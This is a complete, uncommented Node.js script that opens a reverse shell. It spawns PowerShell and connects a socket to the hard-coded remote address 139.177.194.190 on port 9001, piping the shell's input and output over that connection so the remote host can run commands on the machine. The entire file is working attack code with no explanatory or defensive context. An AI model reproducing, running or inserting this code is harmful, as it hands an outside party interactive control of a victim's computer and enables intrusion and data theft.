#! /usr/bin/env node

(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("powershell", []);
    var client = new net.Socket();
    client.connect(9001, "139.177.194.190", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();